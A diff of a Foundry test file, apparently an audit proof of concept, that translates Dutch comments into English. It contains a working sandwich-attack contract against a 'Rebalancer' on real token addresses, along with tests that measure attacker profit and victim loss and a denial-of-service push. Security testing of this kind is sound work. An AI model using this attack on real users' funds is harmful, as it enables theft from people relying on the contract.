@@ -18,7 +18,7 @@ interface ISwapRouter02 {
     function exactInputSingle(ExactInputSingleParams calldata p) external payable returns (uint256);
 }
 
-/// @dev Aanvaller: alles in één transactie (front-run, execute, back-run). Niets genest, dus nonReentrant helpt niet.
+/// @dev Attacker: all in one transaction (front-run, execute, back-run). No nesting, so nonReentrant is no help.
 contract Sandwicher {
     IERC20 constant EURC = IERC20(0x60a3E35Cc302bFA44Cb288Bc5a4F316Fdb1adb42);
     IERC20 constant USDC = IERC20(0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913);
@@ -27,16 +27,16 @@ contract Sandwicher {
     function attack(Rebalancer r, address victim, uint256 pushEurc) external {
         EURC.approve(address(ROUTER), type(uint256).max);
         USDC.approve(address(ROUTER), type(uint256).max);
-        // 1. front-run: verkoop EURC voor USDC -> EURC goedkoper -> cbBTC duurder in EURC (spot omhoog)
+        // 1. front-run: sell EURC for USDC -> EURC cheaper -> cbBTC more expensive in EURC (spot up)
         if (pushEurc > 0) ROUTER.exactInputSingle(ISwapRouter02.ExactInputSingleParams(address(EURC), address(USDC), 500, address(this), pushEurc, 0, 0));
-        // 2. de run van het slachtoffer (koop: EURC -> USDC -> cbBTC) duwt EURC nog verder omlaag
+        // 2. the victim's run (buy: EURC -> USDC -> cbBTC) pushes EURC down even further
         r.execute(victim, address(this));
-        // 3. back-run: koop EURC terug met alle USDC
+        // 3. back-run: buy EURC back with all USDC
         if (pushEurc > 0) ROUTER.exactInputSingle(ISwapRouter02.ExactInputSingleParams(address(USDC), address(EURC), 500, address(this), USDC.balanceOf(address(this)), 0, 0));
     }
 
-    /// @dev Verkooprichting: koop EURC met USDC (EURC duurder -> cbBTC goedkoper in EURC, spot omlaag),
-    ///      laat het slachtoffer cbBTC -> USDC -> EURC verkopen (duwt EURC verder omhoog), verkoop EURC terug.
+    /// @dev Sell direction: buy EURC with USDC (EURC more expensive -> cbBTC cheaper in EURC, spot down),
+    ///      let the victim sell cbBTC -> USDC -> EURC (pushes EURC further up), sell the EURC back.
     function attackSell(Rebalancer r, address victim, uint256 pushUsdc) external {
         EURC.approve(address(ROUTER), type(uint256).max);
         USDC.approve(address(ROUTER), type(uint256).max);
@@ -90,12 +90,12 @@ contract OracleSandwichTest is Test {
         vm.startPrank(victim);
         EURC.approve(address(r), type(uint256).max);
         CBBTC.approve(address(r), type(uint256).max);
-        // maxCorrection 100% -> run = drift * total = 80% van het EURC-saldo
+        // maxCorrection 100% -> run = drift * total = 80% of the EURC balance
         r.setParams(Rebalancer.Params({active: true, targetBps: 8000, bandBps: 500, maxCorrectionBps: 10000, minTradeEurc: 5e6, interval: 1 days, maxSlippageBps: slippageBps}));
         vm.stopPrank();
     }
 
-    /// @dev Grootste push (EURC verkocht in de EURC/USDC-pool) waarbij quoteChecked nog slaagt.
+    /// @dev Largest push (EURC sold into the EURC/USDC pool) at which quoteChecked still succeeds.
     function _maxPushWithinDeviation() internal returns (uint256 push) {
         uint256 lo = 0; uint256 hi = 200_000e6;
         deal(address(EURC), address(this), hi);
@@ -130,29 +130,29 @@ contract OracleSandwichTest is Test {
         uint256 spot0 = r.spot();
         console.log("oracle EURC/cbBTC:", oracle, " spot:", spot0);
         uint256 push = _maxPushWithinDeviation();
-        console.log("max push binnen 50 bps (EURC):", push);
+        console.log("max push within 50 bps (EURC):", push);
 
-        // baseline zonder manipulatie
+        // baseline without manipulation
         uint256 snap = vm.snapshotState();
         (, , uint256 fairBtc) = _run(12_500e6, 100, 0);
         vm.revertToState(snap);
-        console.log("slachtoffer cbBTC zonder aanval:", fairBtc);
+        console.log("victim cbBTC without attack:", fairBtc);
 
         (bool ok, int256 pnl, uint256 btc) = _run(12_500e6, 100, push);
-        console.log("aanval geslaagd:", ok);
-        console.log("aanvaller PnL (EURC 6 dec):"); console.logInt(pnl);
-        console.log("slachtoffer cbBTC met aanval:", btc);
+        console.log("attack succeeded:", ok);
+        console.log("attacker PnL (EURC 6 dec):"); console.logInt(pnl);
+        console.log("victim cbBTC with attack:", btc);
         uint256 lossBtc = fairBtc - btc;
-        console.log("verlies slachtoffer (cbBTC 8 dec):", lossBtc, " in EURC:", lossBtc * oracle / 1e8);
-        console.log("beloning ontvangen door aanvaller (EURC):", uint256(50_000));
+        console.log("victim loss (cbBTC 8 dec):", lossBtc, " in EURC:", lossBtc * oracle / 1e8);
+        console.log("reward received by attacker (EURC):", uint256(50_000));
         assertTrue(ok);
-        assertGt(pnl, 0, "aanvaller verdient niets");
+        assertGt(pnl, 0, "attacker earns nothing");
     }
 
     function test_poc_selfSandwich_10k_slippage30() public {
         uint256 push = _maxPushWithinDeviation();
         (bool ok, int256 pnl, ) = _run(12_500e6, 30, push);
-        console.log("slippage 30 bps: aanval geslaagd:", ok); console.logInt(pnl);
+        console.log("slippage 30 bps: attack succeeded:", ok); console.logInt(pnl);
     }
 
     function test_poc_selfSandwich_1k_slippage100() public {
@@ -161,11 +161,11 @@ contract OracleSandwichTest is Test {
         (, , uint256 fairBtc) = _run(1_250e6, 100, 0);
         vm.revertToState(snap);
         (bool ok, int256 pnl, uint256 btc) = _run(1_250e6, 100, push);
-        console.log("run 1k: geslaagd:", ok); console.logInt(pnl);
-        console.log("run 1k: verlies slachtoffer cbBTC:", fairBtc - btc);
+        console.log("run 1k: succeeded:", ok); console.logInt(pnl);
+        console.log("run 1k: victim loss cbBTC:", fairBtc - btc);
     }
 
-    /// @dev DoS: een push > 50 bps laat isDue/dueOwners leeg en execute reverten; wat kost dat de aanvaller?
+    /// @dev DoS: a push > 50 bps leaves isDue/dueOwners empty and makes execute revert; what does it cost the attacker?
     function test_poc_dosBySpotPush() public {
         _fundVictim(1_250e6, 100);
         (bool due,) = r.isDue(victim);
@@ -174,19 +174,19 @@ contract OracleSandwichTest is Test {
         deal(address(EURC), address(atk), push);
         atk.pushOnly(push);
         (due,) = r.isDue(victim);
-        assertFalse(due, "isDue nog true");
+        assertFalse(due, "isDue still true");
         assertEq(r.dueOwners(0, 10).length, 0);
         vm.expectRevert();
         r.execute(victim, address(this));
-        console.log("DoS-push (EURC):", push, " USDC ontvangen:", USDC.balanceOf(address(atk)));
+        console.log("DoS-push (EURC):", push, " USDC received:", USDC.balanceOf(address(atk)));
     }
 
-    /// @dev Sweep: run-grootte x push-grootte, slippage 100 bps. Print PnL aanvaller en verlies slachtoffer.
+    /// @dev Sweep: run size x push size, slippage 100 bps. Prints attacker PnL and victim loss.
     function test_poc_sweep() public {
         uint256 oracle = r.quote();
         uint256 maxPush = _maxPushWithinDeviation();
         console.log("oracle:", oracle, " spot:", r.spot());
-        console.log("maxPush binnen 50 bps:", maxPush);
+        console.log("maxPush within 50 bps:", maxPush);
         uint256[4] memory runs = [uint256(1_250e6), 3_125e6, 6_250e6, 12_500e6];
         for (uint256 k = 0; k < runs.length; k++) {
             uint256 snap0 = vm.snapshotState();
@@ -200,10 +200,10 @@ contract OracleSandwichTest is Test {
                 (bool ok, int256 pnl, uint256 btc) = _run(runs[k], 100, push);
                 if (ok) {
                     console.log("     push:", push, " victim cbBTC:", btc);
-                    console.log("       verlies slachtoffer (cbBTC):", fairBtc > btc ? fairBtc - btc : 0, " in EURC:", (fairBtc > btc ? fairBtc - btc : 0) * oracle / 1e8);
-                    console.log("       PnL aanvaller (EURC):"); console.logInt(pnl);
+                    console.log("       victim loss (cbBTC):", fairBtc > btc ? fairBtc - btc : 0, " in EURC:", (fairBtc > btc ? fairBtc - btc : 0) * oracle / 1e8);
+                    console.log("       attacker PnL (EURC):"); console.logInt(pnl);
                 } else {
-                    console.log("     push:", push, " -> execute faalt");
+                    console.log("     push:", push, " -> execute fails");
                 }
                 vm.revertToState(snap);
             }
@@ -224,12 +224,12 @@ contract OracleSandwichTest is Test {
         push = lo;
     }
 
-    /// @dev Verkooprun: slachtoffer heeft alleen cbBTC, maxCorrection 100% -> verkoopt 20% van de waarde.
+    /// @dev Sell run: victim holds only cbBTC, maxCorrection 100% -> sells 20% of the value.
     function test_poc_sweepSell() public {
         uint256 oracle = r.quote();
         uint256 maxPush = _maxUsdcPushWithinDeviation();
-        console.log("maxPush USDC binnen 50 bps:", maxPush);
-        uint256[3] memory btcs = [uint256(7_500_000), 18_750_000, 37_500_000]; // ~5k, 12.5k, 25k EURC waarde -> run 1k, 2.5k, 5k
+        console.log("maxPush USDC within 50 bps:", maxPush);
+        uint256[3] memory btcs = [uint256(7_500_000), 18_750_000, 37_500_000]; // ~5k, 12.5k, 25k EURC value -> run 1k, 2.5k, 5k
         for (uint256 k = 0; k < btcs.length; k++) {
             deal(address(CBBTC), victim, btcs[k]);
             vm.startPrank(victim);
@@ -240,7 +240,7 @@ contract OracleSandwichTest is Test {
             vm.prank(address(atk)); r.execute(victim, address(atk));
             uint256 fairEurc = EURC.balanceOf(victim);
             vm.revertToState(snap0);
-            console.log("---- verkooprun, EURC-waarde positie:", btcs[k] * oracle / 1e8, " baseline EURC ontvangen:", fairEurc);
+            console.log("---- sell run, EURC value of position:", btcs[k] * oracle / 1e8, " baseline EURC received:", fairEurc);
             for (uint256 f = 1; f <= 5; f++) {
                 uint256 push = maxPush * f / 5;
                 uint256 snap = vm.snapshotState();
@@ -248,13 +248,13 @@ contract OracleSandwichTest is Test {
                 uint256 usdcBefore = USDC.balanceOf(address(atk));
                 try atk.attackSell(r, victim, push) {
                     int256 pnl = int256(USDC.balanceOf(address(atk))) - int256(usdcBefore);
-                    console.log("     push USDC:", push, " verlies slachtoffer EURC:", fairEurc - EURC.balanceOf(victim));
-                    console.log("       PnL aanvaller (USDC):"); console.logInt(pnl);
-                } catch { console.log("     push USDC:", push, " -> execute faalt"); }
+                    console.log("     push USDC:", push, " victim loss EURC:", fairEurc - EURC.balanceOf(victim));
+                    console.log("       attacker PnL (USDC):"); console.logInt(pnl);
+                } catch { console.log("     push USDC:", push, " -> execute fails"); }
                 vm.revertToState(snap);
             }
             deal(address(CBBTC), victim, 0);
-            vm.warp(block.timestamp); // geen effect, leesbaarheid
+            vm.warp(block.timestamp); // no effect, readability
         }
     }
 }
